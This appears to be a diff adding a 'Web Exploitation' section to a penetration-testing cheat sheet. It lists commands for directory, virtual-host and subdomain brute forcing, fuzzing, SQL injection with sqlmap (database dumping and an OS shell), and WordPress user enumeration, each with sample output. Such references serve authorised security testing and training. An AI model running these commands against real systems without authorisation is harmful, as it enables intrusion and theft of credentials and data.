@@ -1,0 +1,78 @@
+<div class="section" data-category="webexp">
+    <div class="section-header">
+        <div class="section-icon webexp">🌐</div>
+        <h3>Web Exploitation</h3>
+    </div>
+    <ul class="command-list">
+        <li class="command-item">
+            <span class="cmd">gobuster dir -u URL -w wordlist</span>
+            <span class="desc">Directory brute force</span>
+            <code class="example">$ gobuster dir -u http://target -w common.txt<br>/admin  (Status: 200)<br>/login  (Status: 302)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">gobuster vhost -u URL -w wordlist</span>
+            <span class="desc">Virtual host brute force</span>
+            <code class="example">$ gobuster vhost -u http://target -w subdomains.txt<br>Found: dev.target.com (Status: 200)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">gobuster dns -d domain -w wordlist</span>
+            <span class="desc">DNS subdomain brute force</span>
+            <code class="example">$ gobuster dns -d target.com -w subs.txt<br>Found: api.target.com</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">ffuf -u URL/FUZZ -w wordlist</span>
+            <span class="desc">Web fuzzing</span>
+            <code class="example">$ ffuf -u http://target/FUZZ -w words.txt<br>admin  [Status: 200, Size: 1234]</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">ffuf -u URL -H "Host: FUZZ.target"</span>
+            <span class="desc">Header fuzzing</span>
+            <code class="example">$ ffuf -u http://target -H "Host: FUZZ.target.com" -w subs.txt<br>dev  [Status: 200, Size: 5678]</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">wfuzz -w wordlist URL</span>
+            <span class="desc">Parameter fuzzing</span>
+            <code class="example">$ wfuzz -w params.txt http://target?FUZZ=test<br>000012: C=200 "id"</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">sqlmap -u URL --dbs</span>
+            <span class="desc">SQL injection</span>
+            <code class="example">$ sqlmap -u "http://target?id=1" --dbs<br>[*] webapp_db<br>[*] information_schema</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">sqlmap -u URL --dump</span>
+            <span class="desc">Dump database</span>
+            <code class="example">$ sqlmap -u "http://target?id=1" -D webapp_db --dump<br>| admin | password123 |</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">sqlmap -u URL --os-shell</span>
+            <span class="desc">SQL injection to shell</span>
+            <code class="example">$ sqlmap -u "http://target?id=1" --os-shell<br>os-shell&gt; whoami<br>www-data</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">burpsuite</span>
+            <span class="desc">Web proxy/scanner</span>
+            <code class="example">$ burpsuite<br>(launches GUI proxy on 127.0.0.1:8080)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">dirb http://target</span>
+            <span class="desc">Web content scan</span>
+            <code class="example">$ dirb http://10.10.10.5<br>+ http://10.10.10.5/robots.txt (CODE:200)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">whatweb target</span>
+            <span class="desc">Web technology fingerprint</span>
+            <code class="example">$ whatweb http://10.10.10.5<br>Apache[2.4.54] PHP[8.1] WordPress[6.3]</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">wpscan --url target</span>
+            <span class="desc">WordPress scanner</span>
+            <code class="example">$ wpscan --url http://target --enumerate u,p<br>[+] WordPress 6.3<br>[i] User: admin</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">curl -X POST -d "data" URL</span>
+            <span class="desc">POST request</span>
+            <code class="example">$ curl -X POST -d "user=admin&amp;pass=test" http://target/login<br>HTTP/1.1 302 Found</code>
+        </li>
+    </ul>
+</div>
